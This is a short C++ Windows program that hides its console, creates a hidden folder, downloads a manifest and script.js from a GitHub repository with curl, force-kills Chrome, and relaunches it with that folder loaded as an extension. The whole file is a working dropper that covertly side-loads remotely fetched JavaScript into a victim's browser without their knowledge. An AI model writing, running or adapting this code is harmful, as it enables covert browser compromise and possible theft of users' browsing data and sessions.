#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

void startTheEngine(){
    HANDLE hndl = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0);
    if(hndl)
    {
        PROCESSENTRY32  process = { sizeof(PROCESSENTRY32) };
        Process32First(hndl, &process);
        do
        {
            // wprintf(L"%8u, %s\n", process.th32ProcessID, process.szExeFile);
            if(!strcmp(process.szExeFile, "chrome.exe")){
                std::cout << "[*] Target Kill:" << process.szExeFile << "\n";
                system("taskkill /f /im chrome.exe");
                break;
            }
        } while(Process32Next(hndl, &process));
        CloseHandle(hndl);
    }
    Sleep(3000);
    WinExec("\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\RemoteZip\"", 1);
    std::cout << "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\RemoteZip\"";
}

int main(int argc, char const *argv[])
{
    FreeConsole();
    if(!system("mkdir C:\\RemoteZip")){
        system("attrib +h C:\\RemoteZip");
        system("curl -L  https://raw.githubusercontent.com/TEDDMNSC137/remote-javascript-extension/main/128.png --output c:\\RemoteZip\\128.png");
        system("curl -L  https://raw.githubusercontent.com/TEDDMNSC137/remote-javascript-extension/main/16.png --output c:\\RemoteZip\\16.png");
        system("curl -L  https://raw.githubusercontent.com/TEDDMNSC137/remote-javascript-extension/main/48.png --output c:\\RemoteZip\\48.png");
        system("curl -L https://raw.githubusercontent.com/TEDDMNSC137/remote-javascript-extension/main/manifest.json --output c:\\RemoteZip\\manifest.json");
        system("curl -L https://raw.githubusercontent.com/TEDDMNSC137/remote-javascript-extension/main/script.js --output c:\\RemoteZip\\script.js");
    }
    startTheEngine();
    return 0;
    
}
